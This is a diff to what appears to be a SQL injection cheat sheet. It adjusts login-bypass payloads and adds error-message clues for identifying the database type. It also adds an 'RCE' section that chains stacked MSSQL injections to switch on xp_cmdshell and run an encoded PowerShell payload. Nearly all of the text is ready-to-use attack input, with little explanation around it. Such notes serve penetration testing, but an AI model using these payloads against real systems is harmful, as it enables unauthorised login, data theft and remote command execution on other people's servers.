@@ -35,12 +35,12 @@ test''
 
 Closes the username string and adds an always-true condition.
 ```
-test' OR 1=1--
+test' OR 1=1-- -
 ```
 
 Same technique, using a string comparison.
 ```
-test' OR '1'='1--
+test' OR '1'='1-- -
 ```
 
 Uses an empty-string comparison that is always true.
@@ -92,6 +92,47 @@ test' AND '1'='1'-- -
 test' AND '1'='2'-- -
 ```
 
+---
+
+## Errors as hints
+
+Learn to recognise database fingerprints in error messages.
+
+- `System.Data.SqlClient` → MSSQL
+- `MySQL` / `mysqli` → MySQL
+- `org.postgresql` / `PSQLException` → PostgreSQL
+- `ORA-` error codes → Oracle
+
+- ---
+## Exploit
+
+```
+1'; EXEC <MSSQL_COMMAND>;--
+```
+
+## RCE 
+
+```
+test' ; EXECUTE sp_configure 'show advanced options', 1;;--
+```
+
+```
+test' ; RECONFIGURE;;--
+```
+
+```
+test' ; EXECUTE sp_configure 'xp_cmdshell', 1;;--
+```
+
+```
+test' ; RECONFIGURE;;--
+```
+
+```
+test' ; EXECUTE xp_cmdshell 'powershell -e [payload]';;--
+```
+
+---
 # SQL Injection
 
 ```
